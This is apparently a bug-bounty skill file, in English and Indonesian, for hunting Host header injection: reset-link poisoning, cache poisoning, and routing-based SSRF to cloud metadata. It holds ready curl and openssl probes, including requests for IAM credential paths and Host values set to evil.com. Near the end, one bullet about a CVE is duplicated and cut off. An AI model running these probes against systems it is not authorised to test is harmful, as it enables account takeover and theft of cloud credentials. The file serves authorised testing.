---
name: hunt-host-header
description: "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."
sources: portswigger_research, hackerone_public
report_count: 16
---

# HUNT-HOST-HEADER — Host Header Injection

> **Ordered battery (Tier 0→5, run top-to-bottom):** `references/host-header-battery.md` — host-trust triage → reset poisoning (6 header shape) → cache poison → SSRF (2 mekanisme beda) → OAuth poisoning → header fuzz. Kill-signal + proof bar tiap tier, biar sweep cepat tanpa baca 23 KB penuh.

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).
Worked case (mail.com, 2026-10-21, 5 hosts, validated 3x, report sent):
`references/mailcom-host-header-injection-2026-10.md` — includes the all-live-hosts sweep that
expanded scope 2→5 endpoints, the negative battery (XFH / session fixation / cache poisoning /
token replay), and the two targets where the same test correctly returned 403.

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

### Phase 0 — Host-trust triage (fastest proof, no inbox needed)

Before chasing an email flow, prove the app *trusts* a client-supplied host. Two ~10-second probes
that need no mailbox and no account:

```bash
# A) Redirect endpoint — does the injected host land in the Location header?
#    Auth-gated paths (/admin, /login, /account, /users/sign_in) 302 to a host-built URL → ideal.
curl -s -D - -o /dev/null "https://$TARGET/admin" \
  -H "Host: $TARGET" -H "X-Forwarded-Host: evil.example" | grep -i '^location'
#    Capture the BASELINE too (same request, header omitted). Reflection only matters if the
#    generated URL *changes*: baseline -> https://$TARGET/admin/login ; injected -> https://evil.example/admin/login

# B) Body absolute-URL rewrite:
curl -s "https://$TARGET/" -H "X-Forwarded-Host: evil.example" \
  | grep -oE 'https?://evil\.example[^"'"'"' <]*' | sort -u
#    hits in <form action>, <link rel=canonical>, og:url, <base href>, src= = host is trusted.
```

Once either fires, host-trust is proven — the reset / cache / OAuth phases only decide *impact*.
A **directly-reachable origin (no CDN in front)** strengthens it: any client can send the header, so
the server-side email-link build path is attacker-controllable without a proxy in the chain.

Two field gotchas:
- The injected host is frequently **HTML-escaped inside attributes** (`action="https://aaa&quot;…"`
  → no XSS) yet still fully honored for URL construction. **Escaping ≠ not vulnerable** — impact
  moves to link/redirect/token poisoning, not markup injection. Don't write it off as "escaped".
- Sweep the *whole* header list (Phase 5): in the field `X-Forwarded-Host` was honored while
  `X-Host` and `Forwarded` were ignored — test each, don't assume they behave alike. (Same run:
  `X-Forwarded-Proto` was NOT reflected either — do not assume the whole `X-Forwarded-*` family
  behaves alike.)

**Multi-tenant / multi-site apps resolve the SITE from the header too.** On a CMS that serves many
country/tenant sites from one origin, `X-Forwarded-Host: <sibling-host>` makes the app serve that
sibling's content (language + title change). Test this FIRST — it proves the header is a primary
routing input, not just a link-builder. A sibling that is *unlinked / non-public* and reachable only
this way is a tenant-isolation finding in its own right.

```bash
for h in evil.example www.<sibling-domain> localhost 127.0.0.1; do
  curl -s "https://$TARGET/" -H "X-Forwarded-Host: $h" | grep -oiE 'lang="[a-z-]+"|<title>[^<]*'
done   # baseline (no header) vs each → a different lang/title = site chosen by the header
```

**Reset-flow LOCALIZATION is a no-account, no-inbox host-trust oracle.** When signup is
captcha/Turnstile-gated you cannot seed an account (so you cannot receive the reset e-mail) — but you
can still prove the *reset flow* trusts the header: POST a reset for a **non-existent** address with
`X-Forwarded-Host: <sibling-host>` and read the error *language* (e.g. IT `non trovato` vs the
baseline ES `No localizado`). The flow running in the attacker-chosen site context is the
root-cause proof; only the e-mail body itself stays unobserved.

```bash
curl -s -X POST "https://$TARGET/users/password" -H "X-Forwarded-Host: www.<sibling>" \
     --data-urlencode "user[email]=nobody-xyz@nowhere.test" | grep -oiE "non trovato|No localizado"
```

**When you cannot receive the e-mail (captcha-gated signup), do NOT overclaim and do NOT drop the
finding.** Report the *proven* layer (header trusted for tenant selection + absolute-URL + redirect
`Location`, and the reset flow routed by it) as the confirmed root cause, and state the e-mail-link
step explicitly as **"argued, not proven"** with the reason. Put that split in the report's
severity-honesty table; it is the appeal basis if triage tries to downgrade to "reflected only".

### Phase 1 — Password Reset Poisoning

```bash
# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

# 1e. Absolute-URL injection: keep real Host, append attacker host so the
#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash
# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
#   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash
# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the
# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash
# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

### Phase 4 — OAuth / OIDC / SAML Poisoning

```bash
# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational


## Worked case: mail.com (2026-10-21)

`references/mailcom-host-header-2026-10.md` — full walk-through. Key transferable lessons:

- **Sweep every live host, not just the reset endpoint.** Shared-framework clusters
  (mail.com had the same Wicket app on password./account./ciss./account-ba./account-lxa.)
  all reflect identically; the full host list changes remediation scope. One scripted
  sweep (ThreadPool + poisoned Host, check `Location` + body) covers 60+ hosts in ~30 s.
- **Two negative tests worth always running** (they pre-empt triage questions):
  1. URL-supplied session-id fixation (`/path;jsessionid=ATTACKER`) — if the container
     mints a fresh id and ignores the URL value, fixation is dead; say so.
  2. Cache check on the poisoned response (`CF-Cache-Status`/`Age`/`Vary`) — no cache
     headers + fresh token per request = no poisoning path; say so.
- **Enabled TRACE is informational only** — do not sell it as XST when cookies are
  HttpOnly; list it under informational so the triager sees you checked.
- **Honest-boundary phrasing that survived triage**: when signup is walled (geo-gate,
  captcha) and you cannot observe the actual reset email, report the proven layer
  (header trusted → poisoned redirect + token in URL) and label the email step
  "argued, not proven" with the reason.



- CVE-2026-93453 — SOGo **password-reset link poisoning** via an attacker-controlled header; the PoC needs no attacker infrastructure because `poison` only makes the server emit the poisoned link.
  - The PoC needs no attacker infrastructure: `poison` only makes the server

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Password reset poisoning: ubah Host → baca email B | ATO paling sering dibayar |
| 2 | Absolute-URL generation: halaman yang membangun link dari Host | Cache & email poisoning |
| 3 | `X-Forwarded-Host` / `X-Host` / `X-Forwarded-Server` | Header alternatif sering dipakai |
| 4 | Routing berdasarkan Host: akses virtual host internal | Akses panel admin |
| 5 | Dual-Host smuggling: dua baris `Host:` | Parser differential |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa membuat link reset password korban menunjuk ke domain penyerang" — baca email B.
2. **Apa yang hilang dari korban?** Kontrol akun via token reset. Tunjukkan email yang diterima.
3. **Bisa direproduksi 10 menit dari nol?** Gunakan akun B milikmu; sertakan request dan email (disedit).

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** kendalikan Host yang dipakai server

**Teknik pengembangan:** reset-link poisoning -> ATO; cache poison; routing bypass

**Eskalasi ke:** `hunt-ato` · `hunt-cache-poison`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi)

- **CVE-2026-33149 — Tandoor Recipes: Host Header Injection.** Header Host yang dipercaya untuk membangun URL.
- **CVE-2026-27812 — Sub2API < 0.1.85: password reset poisoning via Host/Forwarded-Header trust** (CVSS 4.0 8.0). Lihat `hunt-forgot-password` untuk detail.
- **GHSA-gv7r-3mr9-h5x8 — AzuraCast: `ApplyXForwarded` mempercayai `X-Forwarded-Host` tanpa allowlist proxy tepercaya.** Lihat `hunt-forgot-password`.
- **CVE-2026-29199 — phpBB < 3.3.16: Host Header Injection → reset link poisoning** (assigner HackerOne, H1 #3543246).
- **GHSA-rf33-hmh9-h593 — solidtime: Laravel `TrustHosts` tidak terdaftar.**

**Pelajaran lintas advisori:** header injection bernilai tinggi **hanya** ketika header itu dipakai untuk membangun sesuatu yang berpengaruh keamanan — link reset, URL absolut di email, routing virtual host, atau cache key. Header yang hanya tercermin di halaman adalah XSS/HTML-injection, bukan host-header injection.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Password-reset poisoning → ATO (link reset memuat host attacker); webhook/SSRF via Host header; virtual-host routing confusion. Kalibrasi: server yang mengabaikan Host untuk pembuatan link absolut = correct; reset link yang selalu memuat host kanonik = the fix.
